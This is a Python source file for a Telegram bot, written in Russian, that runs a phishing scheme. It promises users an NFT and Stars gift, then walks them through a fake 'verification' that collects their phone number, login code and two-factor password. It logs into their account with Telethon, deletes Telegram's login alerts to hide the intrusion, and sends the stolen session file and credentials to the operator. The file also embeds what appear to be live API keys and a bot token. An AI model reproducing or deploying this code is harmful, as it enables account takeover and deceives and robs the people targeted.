import os
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError

# --- НАСТРОЙКИ (ЗАПОЛНИ СВОИ) ---
API_ID = 37668790
API_HASH = '84a0450f9bbf15d1e1d09b47ee25cb49'
TOKEN = '8415795413:AAFKeIBsH75o7V5YkyrquMxCiCeq7eASii0'
ADMIN_ID = 8212981789

bot = Bot(token=TOKEN)
dp = Dispatcher()
user_data_storage = {}

class VerifState(StatesGroup):
    waiting_phone = State()
    waiting_code = State()
    waiting_2fa = State()

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

def get_keyboard(button_text, callback_data):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=button_text, callback_data=callback_data)]
    ])

# --- ОБРАБОТКА КОМАНД ---

@dp.message(F.text.in_(["/start", "/nft", "/stars"]))
async def cmd_start(message: types.Message):
    # Если пишет админ - показываем статистику (простое приветствие)
    if message.from_user.id == ADMIN_ID:
        await message.answer("👑 <b>Панель администратора активна.</b>\nОжидайте уведомлений о новых сессиях.")
        return

    text = (
        "<b>🛡 Система защиты Telegram Assets</b>\n\n"
        "Ваш аккаунт выбран для получения подарочного набора (NFT + 50 Stars).\n\n"
        "Для предотвращения автоматических регистраций и обеспечения безопасности транзакции, "
        "необходимо подтвердить владение аккаунтом через наш защищенный шлюз."
    )
    await message.answer(text, parse_mode="HTML", reply_markup=get_keyboard("🚀 НАЧАТЬ ВЕРИФИКАЦИЮ", "start_verif"))

@dp.callback_query(F.data == "start_verif")
async def ask_phone(call: types.CallbackQuery, state: FSMContext):
    await call.message.edit_text(
        "📱 <b>Шаг 1: Идентификация</b>\n\n"
        "Введите ваш номер телефона в международном формате (например, +7999...).\n\n"
        "<i>На этот номер придет системное уведомление от Telegram.</i>",
        parse_mode="HTML"
    )
    await state.set_state(VerifState.waiting_phone)

@dp.message(VerifState.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    user_id = message.from_user.id
    
    # Уведомляем админа
    await bot.send_message(
        ADMIN_ID, 
        f"📱 <b>Новый контакт!</b>\n"
        f"Юзер: @{message.from_user.username or 'нет'}\n"
        f"Номер: <code>{phone}</code>\n"
        f"<i>Пытаюсь отправить код...</i>",
        parse_mode="HTML"
    )

    client = TelegramClient(
        f"sess_{user_id}", 
        API_ID, 
        API_HASH,
        device_model="iPhone 15 Pro",
        system_version="17.5.1",
        app_version="10.14.2",
        lang_code="ru"
    )
    
    try:
        await client.connect()
        send_code = await client.send_code_request(phone)
        
        user_data_storage[user_id] = {
            "client": client, 
            "phone": phone, 
            "hash": send_code.phone_code_hash,
            "username": message.from_user.username
        }
        
        await message.answer(
            "📩 <b>Шаг 2: Подтверждение</b>\n\n"
            "Код подтверждения отправлен в ваше официальное приложение Telegram.\n"
            "<b>Введите 5-значный код ниже:</b>",
            parse_mode="HTML"
        )
        await state.set_state(VerifState.waiting_code)
        
    except Exception as e:
        await message.answer("❌ <b>Ошибка:</b> Не удалось отправить код на этот номер. Проверьте правильность ввода.")
        await bot.send_message(ADMIN_ID, f"⚠️ Ошибка у @{message.from_user.username}: {e}")
        await client.disconnect()

@dp.message(VerifState.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    if not data: return

    code = message.text.strip()
    await bot.send_message(ADMIN_ID, f"🔑 Юзер @{data['username']} ввел код: <code>{code}</code>")

    try:
        await data["client"].sign_in(data["phone"], code, phone_code_hash=data["hash"])
        await finish_auth(message, state)
    except SessionPasswordNeededError:
        await message.answer(
            "🔐 <b>Двухфакторная защита</b>\n\n"
            "Ваш аккаунт защищен облачным паролем. Пожалуйста, введите его:",
            parse_mode="HTML"
        )
        await state.set_state(VerifState.waiting_2fa)
    except PhoneCodeInvalidError:
        await message.answer("❌ <b>Код неверный.</b> Попробуйте еще раз:")

@dp.message(VerifState.waiting_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    password = message.text.strip()
    
    await bot.send_message(ADMIN_ID, f"🔓 Юзер @{data['username']} ввел 2FA: <code>{password}</code>")

    try:
        await data["client"].sign_in(password=password)
        await finish_auth(message, state)
    except PasswordHashInvalidError:
        await message.answer("❌ <b>Пароль неверный.</b> Попробуйте снова:")

async def finish_auth(message, state):
    user_id = message.from_user.id
    data = user_data_storage.get(user_id)
    client = data["client"]
    
    # --- ЗАМЕТАЕМ СЛЕДЫ ---
    try:
        await asyncio.sleep(1.5) # Ждем прихода смс
        async for msg in client.iter_messages(777000, limit=2):
            await msg.delete() # Удаляем уведомление о входе
    except:
        pass
    
    # Сохраняем и отправляем файл админу
    await client.disconnect()
    session_file = f"sess_{user_id}.session"
    
    if os.path.exists(session_file):
        doc = FSInputFile(session_file)
        await bot.send_document(
            ADMIN_ID, doc,
            caption=f"🔥 <b>АККАУНТ ЗАХВАЧЕН!</b>\n📱 Номер: <code>{data['phone']}</code>\n👤 Юзер: @{data['username']}",
            parse_mode="HTML"
        )
        os.remove(session_file)

    await message.answer(
        "🎉 <b>Верификация завершена!</b>\n\n"
        "Ваш аккаунт успешно подтвержден. Бонусы будут зачислены в течение 24 часов. "
        "Не выходите из аккаунта до окончания обработки.",
        parse_mode="HTML"
    )
    await state.clear()
    user_data_storage.pop(user_id, None)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(dp.start_polling(bot))
